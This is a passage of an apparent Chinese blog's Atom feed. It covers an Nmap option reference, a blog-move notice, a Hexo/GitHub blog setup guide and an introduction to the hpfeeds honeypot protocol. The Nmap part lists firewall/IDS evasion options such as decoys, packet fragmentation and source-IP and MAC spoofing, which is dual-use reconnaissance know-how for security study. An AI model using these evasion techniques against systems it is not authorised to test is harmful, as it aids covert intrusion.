&lt;li&gt;–top-ports &amp;lt;数量&amp;gt;扫描指定数量的熟知端口&lt;h2 id=&quot;0x06-参数-【服务和版本检测】&quot;&gt;&lt;a href=&quot;#0x06-参数-【服务和版本检测】&quot; class=&quot;headerlink&quot; title=&quot;0x06 参数-【服务和版本检测】&quot;&gt;&lt;/a&gt;0x06 参数-【服务和版本检测】&lt;/h2&gt;&lt;/li&gt;
&lt;li&gt;-sV，服务版本检测&lt;/li&gt;
&lt;li&gt;–allports，版本检测不跳过任何端口，默认情况下会跳过TCP端口9100，因为一些打印机会打印传送到该端口的任何信息。&lt;/li&gt;
&lt;li&gt;–version-intensity &amp;lt;强度&amp;gt; 0-9，修改版本扫描检测强度。&lt;/li&gt;
&lt;li&gt;–version-light，强度2&lt;/li&gt;
&lt;li&gt;–version-all，强度9&lt;/li&gt;
&lt;li&gt;–version-trace，显示Nmap的版本识别过程&lt;h2 id=&quot;0x07-参数-【系统检测】&quot;&gt;&lt;a href=&quot;#0x07-参数-【系统检测】&quot; class=&quot;headerlink&quot; title=&quot;0x07 参数-【系统检测】&quot;&gt;&lt;/a&gt;0x07 参数-【系统检测】&lt;/h2&gt;&lt;/li&gt;
&lt;li&gt;-O 开启系统检测&lt;/li&gt;
&lt;li&gt;–osscan-limit，只检查一定条件的系统，有一个检测到的端口&lt;/li&gt;
&lt;li&gt;–osscan-guess，百分比显示可能的系统选项&lt;/li&gt;
&lt;li&gt;–max-os-tries，在未能匹配系统时，Nmap会重复检测5次，这个次数可以设置&lt;h2 id=&quot;0x08-参数-【NSE】&quot;&gt;&lt;a href=&quot;#0x08-参数-【NSE】&quot; class=&quot;headerlink&quot; title=&quot;0x08 参数-【NSE】&quot;&gt;&lt;/a&gt;0x08 参数-【NSE】&lt;/h2&gt;NSE,Nmap脚本引擎，Nmap里最强大最灵活的特性，允许用户编写LUA语言脚本实现各种测试任务。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;目前的脚本类别目录有：&lt;/p&gt;
&lt;hr&gt;
&lt;pre&gt;&lt;code&gt;auth，认证-目标系统身份验证
broadcast，广播-广播发现目标
brute，爆破-爆破身份验证
default，缺省-默认调用
discovery，发现-积极发现更多公共注册服务
dos，拒绝服务-DOS攻击
exploit，利用-利用一些漏洞
external，外部-会将数据发送给第三方
fuzzer，模糊测试-随机字段发送包，可以发现一些未被发现的漏洞
intrusive，侵入-风险过高的脚本
malware，恶意程序-测试目标是否被恶意程序感染
safe，安全-风险很低的脚本
version，版本-扩展版本检测功能，不能显式调用
vuln，漏洞-检测特定的已知漏洞
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;ol&gt;
&lt;li&gt;-sC，缺省脚本执行&lt;/li&gt;
&lt;li&gt;&lt;p&gt;–script &amp;lt;文件名&amp;gt;|&amp;lt;类别&amp;gt;|&amp;lt;目录&amp;gt;|&amp;lt;表达式&amp;gt;…，可以使用+来强制脚本运行，也可以用 &lt;em&gt;all&lt;/em&gt; 来遍历所有脚本，这两个选项要慎重使用&lt;/p&gt;
&lt;p&gt; nmap –script “http-*” 加载所有http前缀的脚本&lt;/p&gt;
&lt;p&gt; nmap –script “not intrusive”&lt;/p&gt;
&lt;p&gt; nmap –script “default or safe”&lt;/p&gt;
&lt;p&gt; nmap –script “default and safe”&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;–script-args &amp;lt;脚本&amp;gt;=&amp;lt;参数&amp;gt;,给脚本提供参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;–script-args-file &amp;lt;文件名&amp;gt;，从文件提供参数&lt;/li&gt;
&lt;li&gt;–script-help &amp;lt;脚本名&amp;gt;，帮助&lt;/li&gt;
&lt;li&gt;–script-trace 打印脚本执行过程&lt;/li&gt;
&lt;li&gt;&lt;p&gt;–script-updatedb，升级脚本库&lt;/p&gt;
&lt;h2 id=&quot;0x09-参数-【时间与性能】&quot;&gt;&lt;a href=&quot;#0x09-参数-【时间与性能】&quot; class=&quot;headerlink&quot; title=&quot;0x09 参数-【时间与性能】&quot;&gt;&lt;/a&gt;0x09 参数-【时间与性能】&lt;/h2&gt;&lt;p&gt;时间单位：ms s m h&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;–min(max)-hostgroup &amp;lt;主机数&amp;gt;，调整并行扫描组主机数。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;–min(max)-parallelism &amp;lt;探针数&amp;gt;，调整并行探针数。&lt;/li&gt;
&lt;li&gt;–min(max，initial)-rtt-timeout &amp;lt;时间&amp;gt;，调整探针超时时间&lt;/li&gt;
&lt;li&gt;–max-retries &amp;lt;数量&amp;gt;，指定端口扫描探针最大值，最大重试次数&lt;/li&gt;
&lt;li&gt;–host-timeout &amp;lt;时间&amp;gt;，放弃超时主机目标&lt;/li&gt;
&lt;li&gt;–scan-delay &amp;lt;时间&amp;gt;，调整探针之间的延迟时间&lt;/li&gt;
&lt;li&gt;–min(max)-rate &amp;lt;数字&amp;gt;，调整扫描速率，每秒发送的包数&lt;/li&gt;
&lt;li&gt;-T &lt;0-5&gt;时间模板，越大越快&lt;h2 id=&quot;0x10-参数-【防火墙IDS逃逸】&quot;&gt;&lt;a href=&quot;#0x10-参数-【防火墙IDS逃逸】&quot; class=&quot;headerlink&quot; title=&quot;0x10 参数-【防火墙IDS逃逸】&quot;&gt;&lt;/a&gt;0x10 参数-【防火墙IDS逃逸】&lt;/h2&gt;&lt;/0-5&gt;&lt;/li&gt;
&lt;li&gt;-f，分隔包碎片&lt;/li&gt;
&lt;li&gt;-mtu，指定偏移量分隔包碎片&lt;/li&gt;
&lt;li&gt;-D &amp;lt;诱饵&amp;gt;&amp;lt;,ME&amp;gt;，使用诱饵掩盖IP&lt;/li&gt;
&lt;li&gt;-S &amp;lt; IP &amp;gt;，伪造源地址IP&lt;/li&gt;
&lt;li&gt;-e &amp;lt; interface &amp;gt;，使用特定接口发送接收包&lt;/li&gt;
&lt;li&gt;–source-port &amp;lt; portnum &amp;gt;，伪造源端口号&lt;/li&gt;
&lt;li&gt;–data &amp;lt; hex string &amp;gt;，添加自定义二进制数据到发送包&lt;/li&gt;
&lt;li&gt;–data &amp;lt; string &amp;gt;，添加自定义字符串到发送包&lt;/li&gt;
&lt;li&gt;–data-length &amp;lt; num &amp;gt;，添加随机数据到发送包&lt;/li&gt;
&lt;li&gt;–ip-option &amp;lt; hex string &amp;gt;，用指定的IP选项发送数据包&lt;/li&gt;
&lt;li&gt;–ttl &amp;lt; value &amp;gt;，设置存活时间&lt;/li&gt;
&lt;li&gt;–randomize-hosts，随机主机目标顺序&lt;/li&gt;
&lt;li&gt;–spoof-mac &amp;lt; MAC,prefix,… &amp;gt;伪造MAC地址&lt;/li&gt;
&lt;li&gt;–proxies &amp;lt; URL &amp;gt;，通过代理链中继TCP连接&lt;/li&gt;
&lt;li&gt;–badsum，发送虚假校验和&lt;/li&gt;
&lt;li&gt;–adler32，使用另一种校验和代替CRC32C&lt;h2 id=&quot;0x11-参数-【输出】&quot;&gt;&lt;a href=&quot;#0x11-参数-【输出】&quot; class=&quot;headerlink&quot; title=&quot;0x11 参数-【输出】&quot;&gt;&lt;/a&gt;0x11 参数-【输出】&lt;/h2&gt;&lt;/li&gt;
&lt;li&gt;-oN &amp;lt; file &amp;gt;，正常输出&lt;/li&gt;
&lt;li&gt;-oX，XML输出&lt;/li&gt;
&lt;li&gt;-oS，脚本输出&lt;/li&gt;
&lt;li&gt;-oG，已弃用&lt;/li&gt;
&lt;li&gt;-oA，全格式&lt;/li&gt;
&lt;li&gt;-v &amp;lt; level &amp;gt;，增加Nmap输出普通信息水平&lt;/li&gt;
&lt;li&gt;-d &amp;lt; level &amp;gt;，增加调试信息输出水平&lt;/li&gt;
&lt;li&gt;–reason，给出原因&lt;/li&gt;
&lt;li&gt;–stats-every &amp;lt; time &amp;gt;，每过固定时间打印一次数据&lt;/li&gt;
&lt;li&gt;–packet-trace，数据包路径&lt;/li&gt;
&lt;li&gt;–open，显示打开的端口&lt;/li&gt;
&lt;li&gt;–iflist，列表接口和路径&lt;/li&gt;
&lt;li&gt;–append-output，结果添加到输出&lt;/li&gt;
&lt;li&gt;–resume &lt;filename&gt;，恢复终止的扫描&lt;h2 id=&quot;0x12-参数-【混合选项】&quot;&gt;&lt;a href=&quot;#0x12-参数-【混合选项】&quot; class=&quot;headerlink&quot; title=&quot;0x12 参数-【混合选项】&quot;&gt;&lt;/a&gt;0x12 参数-【混合选项】&lt;/h2&gt;&lt;/filename&gt;&lt;/li&gt;
&lt;li&gt;-6，开启IPv6扫描&lt;/li&gt;
&lt;li&gt;-A，积极扫描策略（-O，-sV，-sC，–traceroute）&lt;/li&gt;
&lt;li&gt;–datadir &amp;lt; directoryname &amp;gt; 指定Nmap数据文件&lt;/li&gt;
&lt;li&gt;–servicedb &amp;lt; services file &amp;gt;，指定Nmap服务库&lt;/li&gt;
&lt;li&gt;–versiondb &amp;lt; service probes file &amp;gt;，指定版本库&lt;/li&gt;
&lt;li&gt;–release-memory，推出前释放内存&lt;/li&gt;
&lt;li&gt;-V，显示版本号&lt;br&gt;参考：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href=&quot;http://nmap.org&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://nmap.org&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.91ri.org/4105.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;实战高级用法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.91ri.org/3870.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;绕过防火墙与脚本使用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;原创文章，转载请注明： 转载自零の杂货铺&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-基本介绍&quot;&gt;&lt;a href=&quot;#0x00-基本介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 基本介绍&quot;&gt;&lt;/a&gt;0x00 基本介绍&lt;/h2&gt;&lt;p&gt;整合了官网和网上的一些资料，本来是有配图的，但是一想到可能会暴露一些敏感信息，就不摆在这了，不足之处，欢迎交流。&lt;/p&gt;
&lt;p&gt;Nmap现在最新的版本是Nmap 7。主要是增加了IPV6和ssl方面的支持。&lt;/p&gt;
&lt;p&gt;Nmap，全称Network Mapper，开源网络探测与审计框架。使用构造异常IP包的方式来探测主机服务。&lt;br&gt;
    
    </summary>
    
      <category term="安全工具" scheme="http://phantom0301.github.io/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="namp" scheme="http://phantom0301.github.io/tags/namp/"/>
    
  </entry>
  
  <entry>
    <title>博客搬家</title>
    <link href="http://phantom0301.github.io/2016/03/02/Home/"/>
    <id>http://phantom0301.github.io/2016/03/02/Home/</id>
    <published>2016-03-02T02:46:27.000Z</published>
    <updated>2016-08-04T07:58:31.920Z</updated>
    
    <content type="html">&lt;p&gt;gitcafe博客&lt;strong&gt;搬家&lt;/strong&gt;了~~&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;之前把博客部署在gitcafe和github上，不过最近得到了通知，gitcafe和coding合作了，原来在gitcafe上的服务到今年的5月份就停了。&lt;/p&gt;
&lt;p&gt;所以只能把原来部署在cafe上的博客移交到coding了&lt;/p&gt;
&lt;p&gt;现在有两个稳定可访问的域名：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://phantom0301.github.io&quot; title=&quot;phantom0301.github.io&quot;&gt;phantom0301.github.io&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://phantom0301.coding.io&quot; title=&quot;phantom0301.coding.me&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;phantom0301.coding.me&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;gitcafe博客&lt;strong&gt;搬家&lt;/strong&gt;了~~&lt;br&gt;
    
    </summary>
    
      <category term="感悟" scheme="http://phantom0301.github.io/categories/%E6%84%9F%E6%82%9F/"/>
    
    
      <category term="感悟" scheme="http://phantom0301.github.io/tags/%E6%84%9F%E6%82%9F/"/>
    
  </entry>
  
  <entry>
    <title>HEXO+github搭建博客总结</title>
    <link href="http://phantom0301.github.io/2016/02/20/Hexo/"/>
    <id>http://phantom0301.github.io/2016/02/20/Hexo/</id>
    <published>2016-02-20T08:21:27.000Z</published>
    <updated>2016-08-04T07:55:55.691Z</updated>
    
    <content type="html">&lt;p&gt;用hexo+github搭建个人博客，有许多坑值得去填，这里就把从各个博客学到的填坑方式在这里说一下。&lt;/p&gt;
&lt;p&gt;另外，有许多资料都是针对hexo2.x版本的，我现在的版本是3.1.1。查找资料的时候一定要注意。这里只是列出问题查找的方向，根据这个方向更便于在网上找到解决的方法。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-准备&quot;&gt;&lt;a href=&quot;#0x01-准备&quot; class=&quot;headerlink&quot; title=&quot;0x01 准备&quot;&gt;&lt;/a&gt;0x01 准备&lt;/h2&gt;&lt;p&gt;1.github账号：安装git，申请github账号，设置好ssh。再新建一个项目，然后在项目的setting中设置为个人页面。&lt;/p&gt;
&lt;p&gt;2.安装node.js，使用npm命令安装hexo，后面还会大量的用到npm来安装。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm install -g hexo
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x02-搭建基本框架&quot;&gt;&lt;a href=&quot;#0x02-搭建基本框架&quot; class=&quot;headerlink&quot; title=&quot;0x02 搭建基本框架&quot;&gt;&lt;/a&gt;0x02 搭建基本框架&lt;/h2&gt;&lt;p&gt;在本地电脑新建一个文件夹a，在a里使用git bash初始化一个hexo项目。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hexo init
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时会生成许多文件夹，在输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;npm install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装一些必要包。&lt;/p&gt;
&lt;p&gt;执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hexo generate
hexo server -p 8080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时候应该可以在本地用&lt;a href=&quot;http://localhost:8080打开原始框架页面了&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:8080打开原始框架页面了&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;p&gt;-p后面的端口要根据自己的情况来写，网上大多使用默认的4000，可是我的4000端口已经用了，这样就会导致网页打不开。&lt;/p&gt;
&lt;p&gt;在本地打开成功后，就可以开始上传到github上了。&lt;/p&gt;
&lt;p&gt;打开a里的_config.yml,推荐使用sublime，如果使用其他工具，请注意要保存时格式应为&lt;strong&gt;utf-8&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;找到deploy一栏，修改如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;deploy:
  type: git
  repository: https://github.com/你的github名/你的github名.github.io.git
  branch: master
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意，这里作为个人页面的github项目一定要和用户名相同。&lt;/p&gt;
&lt;p&gt;然后在git bash中输入&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hexo deploy
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里注意有两种deploy的方式，&lt;a href=&quot;https://的方式会要求你输入github的账号密码；ssh的方式只要事先设置好密钥就不再需要多余的操作了。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://的方式会要求你输入github的账号密码；ssh的方式只要事先设置好密钥就不再需要多余的操作了。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这时，就可以用&lt;strong&gt;你的github名.github.io&lt;/strong&gt;来访问&lt;/p&gt;
&lt;h2 id=&quot;0x03-打磨博客&quot;&gt;&lt;a href=&quot;#0x03-打磨博客&quot; class=&quot;headerlink&quot; title=&quot;0x03 打磨博客&quot;&gt;&lt;/a&gt;0x03 打磨博客&lt;/h2&gt;&lt;p&gt;1.发表博文&lt;br&gt;使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hexo new “文章名”
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;新建博文，这时会在a/source/_post下生成相应的.md文件，打开编辑。&lt;br&gt;在——下面就可以使用markdown语法写博文。&lt;/p&gt;
&lt;p&gt;写好后，保存，执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hexo generate
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就可以在a/public中相应的位置生成博文。&lt;/p&gt;
&lt;p&gt;那么以后的程式化操作就是&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;hexo new “  ” 写博文
hexo clean 清除public
hexo generate 编译
hexo server -p 8080 本地测试
hexo deploy 部署到远程服务器
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.装饰博客&lt;br&gt;基本框架布置好，装饰的事大家就各显神通了。&lt;/p&gt;
&lt;p&gt;通常会在以下几个点进行修改&lt;/p&gt;
&lt;p&gt;a/_config.yml&lt;/p&gt;
&lt;p&gt;这里修改博客主页的名字，源信息，子页面url格式等&lt;/p&gt;
&lt;p&gt;最重要的是主题的选用，插件的使用都在这里编辑完成。&lt;br&gt;如果你要使用rss、sitemap、更改deploy的对象就需要在这里修改&lt;/p&gt;
&lt;p&gt;a/themes/&lt;br&gt;存放你找来的各种主题b、c、d……&lt;/p&gt;
&lt;p&gt;a/themes/b/_config.yml&lt;br&gt;负责单个主题的框架修改，&lt;br&gt;包括网页的logo图片选择、框架中主菜单显示的文本及连接&lt;/p&gt;
&lt;p&gt;a/public&lt;br&gt;静态生成的网页，也就是会上传到github上的文件。&lt;/p&gt;
&lt;p&gt;网上有很多教程，而且如果前面都部署成功了，后面就可以自己慢慢geek了&lt;/p&gt;
&lt;h2 id=&quot;0x04-其他的一些坑&quot;&gt;&lt;a href=&quot;#0x04-其他的一些坑&quot; class=&quot;headerlink&quot; title=&quot;0x04 其他的一些坑&quot;&gt;&lt;/a&gt;0x04 其他的一些坑&lt;/h2&gt;&lt;p&gt;github的博客可以被google站长收录，但是baidu被禁止爬去github，所以，如果想让baidu也能搜得到你，就部署在gitcafe上。&lt;/p&gt;
&lt;p&gt;如果hexo generate报错，多半是两个地方的_config.yml更改的有问题，所以一是要备份yml文件或者从git上拉取之前部署成功的文件，二是要边改边generate在本地查看，一点点琢磨不同位置的属性。&lt;/p&gt;
&lt;p&gt;a/_config.yml中的url设置如果没有购买域名的话，看似没有作用，但会影响生成的sitemap中的路径，所以在多个平台（github、gitcafe）部署的时候，不仅要修改deploy，还要根据需要修改url。&lt;/p&gt;
&lt;p&gt;否则，即便sitemap能被百度站长工具访问到，也会提示说 &lt;strong&gt;主域验证错误&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;因为是事后总结，暂时想到的就这么多，其他还有什么安装过程中的问题可以直接博客留言，&lt;strong&gt;见即回 &lt;/strong&gt;  ：）&lt;/p&gt;
&lt;p&gt;原创文章，转载请注明： 转载自零の杂货铺&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;用hexo+github搭建个人博客，有许多坑值得去填，这里就把从各个博客学到的填坑方式在这里说一下。&lt;/p&gt;
&lt;p&gt;另外，有许多资料都是针对hexo2.x版本的，我现在的版本是3.1.1。查找资料的时候一定要注意。这里只是列出问题查找的方向，根据这个方向更便于在网上找到解决的方法。&lt;/p&gt;
    
    </summary>
    
      <category term="HEXO" scheme="http://phantom0301.github.io/categories/HEXO/"/>
    
    
      <category term="HEXO" scheme="http://phantom0301.github.io/tags/HEXO/"/>
    
      <category term="个人博客" scheme="http://phantom0301.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>MHN开源蜜罐项目学习笔记（一）HPFEEDS协议</title>
    <link href="http://phantom0301.github.io/2016/02/19/Hpfeeds/"/>
    <id>http://phantom0301.github.io/2016/02/19/Hpfeeds/</id>
    <published>2016-02-19T09:13:55.000Z</published>
    <updated>2016-08-04T07:57:20.316Z</updated>
    
    <content type="html">&lt;p&gt;Hpfeeds和蜜罐是一对好搭档，想要完全掌握一个分布式蜜罐的信息传递，就来了解Hpfeeds协议吧！&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x00-hpfeeds协议是什么？&quot;&gt;&lt;a href=&quot;#0x00-hpfeeds协议是什么？&quot; class=&quot;headerlink&quot; title=&quot;0x00 hpfeeds协议是什么？&quot;&gt;&lt;/a&gt;0x00 hpfeeds协议是什么？&lt;/h2&gt;&lt;p&gt;feeds，供稿，原始数据。&lt;/p&gt;
&lt;p&gt;hpfeeds是一个轻量级的验证发布-订阅协议(authenticated publish-subscribe protocol)。&lt;/p&gt;
&lt;p&gt;轻量级好理解，就是代码量相对较少，功能相对不复杂。那什么是发布-订阅协议呢？订阅发布协议定义了一种一对多的依赖关系，让多个订阅者对象同时监听某一个主题对象。这个主题对象在自身状态变化时，会通知所有订阅者对象，使它们能够自动更新自己的状态。它是为了解决这样一种情况的发生，一个对象的改变需要同时改变其他对象，而且它不知道具体有多少对象需要改变。我的理解，这就类似于发传单，目标发送通知，没有指定特定的对象，通知会自动传播，观察者自己决定是否需要看传单，发送者对于传单是否被看一无所知。&lt;/p&gt;
&lt;p&gt;详细的发布订阅者介绍可以戳这里：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/ff649664.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://msdn.microsoft.com/en-us/library/ff649664.aspx&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;线路协议组成如下：&lt;/p&gt;
&lt;p&gt;首先是消息头：有两个参数，消息总长和消息类型&lt;/p&gt;
&lt;p&gt;消息类型有以下几种：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;error (0): errormessage
info (1): server name, nonce
auth (2): client id, sha1(nonce+authkey)
publish (3): client id, channelname, payload
subscribe (4): client id, channelname
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数字代表消息类型，而冒号后面的内容则代表后续的消息字段&lt;/p&gt;
&lt;p&gt;比如说当消息类型为3，publish时，后面的字段就会有四个：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;client id的长度
client id
channelname的长度
channelname
payload
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一个完整的消息如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;length | opcode | next | identifier | next | channelname|payload
----------------------------------------------------------------
85       3        9       b4aa2@hp1   9      mwcapture      137941a3d8589f6728924c08561070bceb5d72b8,http://1.2.3.4/calc.exe
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;消息有了，整个消息的认证过程就是以下的几个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;/li&gt;
&lt;li&gt;服务器为每一个连接生成一个标志&lt;/li&gt;
&lt;li&gt;客户端发送id 和 标志+authkey组成的sha1&lt;/li&gt;
&lt;li&gt;服务器检查id和sha1&lt;/li&gt;
&lt;li&gt;服务器检查数据类型，是要发布还是要订阅&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最终实现服务器、发布者、订阅者之间的解耦，彼此之间完全独立，互不干扰。&lt;/p&gt;
&lt;h2 id=&quot;0x01-为什么要用hpfeeds协议&quot;&gt;&lt;a href=&quot;#0x01-为什么要用hpfeeds协议&quot; class=&quot;headerlink&quot; title=&quot;0x01 为什么要用hpfeeds协议&quot;&gt;&lt;/a&gt;0x01 为什么要用hpfeeds协议&lt;/h2&gt;&lt;p&gt;首先，正如以上所说的，整个协议实现了三方的功能独立。使用这种方式降低了应用与业务逻辑之间的耦合，统一一个对外的发布接口，只需要关心监听的类型，不关心监听的具体处理人。只管发，不管到不到。很方便的建立一种一对多的依赖关系。&lt;/p&gt;
&lt;p&gt;在当一个对象的改变需要同时改变其他对象，而且它不知道具体有多少对象需要改变时，就可以使用订阅发布模式。&lt;/p&gt;
&lt;p&gt;hpfeeds协议希望能够实现一个单一的连线形式，使得每一个人都可以在任何时间以任何语言去订阅发布数据，不同的数据以通道来划分，由通道的使用者来决定数据结构形式。而通道的验证通过authkey来完成，它由两部分组成，ident和secret，相当于身份和密码。密码在hash后和每一个临时连接标志一起发送给服务器，这样保证不会被窃听，所以它可以运行在SSL、TLS下。&lt;/p&gt;
&lt;p&gt;优点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1.降低耦合。发布者对于接收者的数量，身份，接收的数据类型一无所知。&lt;/li&gt;
&lt;li&gt;2.安全性高。只有消息订阅者之间的单线信息交互，不存在其他程序的信息交换。&lt;/li&gt;
&lt;li&gt;3.测试方便。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;缺点&lt;/p&gt;
&lt;p&gt;性能降低，订阅要进行管理&lt;/p&gt;
&lt;h2 id=&quot;0x02-如何操作&quot;&gt;&lt;a href=&quot;#0x02-如何操作&quot; class=&quot;headerlink&quot; title=&quot;0x02 如何操作&quot;&gt;&lt;/a&gt;0x02 如何操作&lt;/h2&gt;&lt;p&gt;正常安装使用hpfeeds的步骤如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/rep/hpfeeds/
cd hpfeeds
python setup.py build
python setup.py install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装成功后，会出现下面几个文件夹。&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/1.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;appsuport：hpfeeds支持的一些蜜罐的应用程序&lt;/li&gt;
&lt;li&gt;broker：服务器功能程序集，包括增加用户，服务器运行，查看所有用户信息等&lt;/li&gt;
&lt;li&gt;build：一些编译环境&lt;/li&gt;
&lt;li&gt;cli：用户程序&lt;/li&gt;
&lt;li&gt;example：例程&lt;/li&gt;
&lt;li&gt;lib：支持库&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用时先打开broker，运行其中的add_user.py添加用户信息：&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/2.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;根据提示信息，我们添加用户test，密码123456，拥有发布频道1，2，无订阅频道&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/3.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;再添加用户custom，密码123456，拥有订阅频道1，2，无发布频道&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;现在使用dump_users.py查看刚才创建的用户&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/5.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如图所示，这里应经可以查看到刚才我们新建的用户了。&lt;/p&gt;
&lt;p&gt;接下来，我们打开服务器feedbroker.py&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/6.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;再开启一个新的进程运行cli文件夹里的用户程序hpfeeds-client&lt;/p&gt;
&lt;p&gt;先开启订阅者custom，使用1频道&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/7.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;此时，服务器端显示用户登录成功&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/8.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们再打开一个新的进程，以发布者test，使用1频道发布“helloworld”&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/9.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们可以看到发布者一旦发布完消息后，立即退出进程，并不确认消息是否收到&lt;/p&gt;
&lt;p&gt;这时，服务器显示test登录成功&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/10.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;于此同时，订阅者custom成功接收到消息&lt;br&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/11.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;到此，一次完整的发送、接收消息的流程就走完了。&lt;/p&gt;
&lt;p&gt;通过这一过程，我们发现，频道与用户分离，发送和订阅者身份平等，只需订阅者实时监听，发送者可以即时发送即时撤出。&lt;/p&gt;
&lt;p&gt;这里是对于hpfeeds协议的简单介绍，下一部分我会从代码的角度进一步分析该协议，并适当对于协议功能进行添加。&lt;/p&gt;
&lt;p&gt;原创文章，转载请注明： 转载自零の杂货铺&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;Hpfeeds和蜜罐是一对好搭档，想要完全掌握一个分布式蜜罐的信息传递，就来了解Hpfeeds协议吧！&lt;br&gt;
    
    </summary>
    
      <category term="蜜罐" scheme="http://phantom0301.github.io/categories/%E8%9C%9C%E7%BD%90/"/>
    
    
      <category term="MHN" scheme="http://phantom0301.github.io/tags/MHN/"/>
    
